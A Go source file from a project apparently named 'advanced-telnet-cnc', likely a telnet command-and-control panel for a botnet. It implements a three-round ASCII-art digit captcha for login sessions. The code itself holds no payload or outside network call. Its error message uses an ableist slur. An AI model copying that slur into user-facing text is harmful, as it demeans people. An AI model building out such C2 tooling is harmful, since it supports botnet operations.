package view

import (
	"advanced-telnet-cnc/source/config"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"bytes"
	"errors"
	"fmt"
	"github.com/common-nighthawk/go-figure"
	"math/rand"
	"os"
	"strconv"
	"strings"
)

func Captcha(fx *termfx.TermFX, session *sessions.Session) error {
	ansi, err := os.ReadFile("assets/ansi.flf")
	if err != nil {
		config.Logger.Error("Captcha font could not be found.")
		return err
	}

	for i := 0; i < 3; i++ {
		var captcha = strconv.Itoa(rand.Intn(10))

		session.Clear()
		session.Println()

		err := session.Print(fmt.Sprintf("\033]0;%d/3\007", i+1))
		if err != nil {
			return err
		}

		myFigure := figure.NewFigureWithFont(captcha, bytes.NewReader(ansi), true)
		for i, printRow := range myFigure.Slicify() {
			if i >= len(myFigure.Slicify())-1 {
				session.Print("  " + strings.ReplaceAll(printRow, " ", " "))
				continue
			}
			session.Println("  " + strings.ReplaceAll(printRow, " ", " "))
		}

		line, err := session.Reader.LiveReader("\r\n", false, func(key string) bool {
			return true
		})

		if err != nil {
			return err
		}

		if line != captcha {
			return errors.New("invalid captcha, retard")
		}
	}

	session.Clear()

	return nil
}
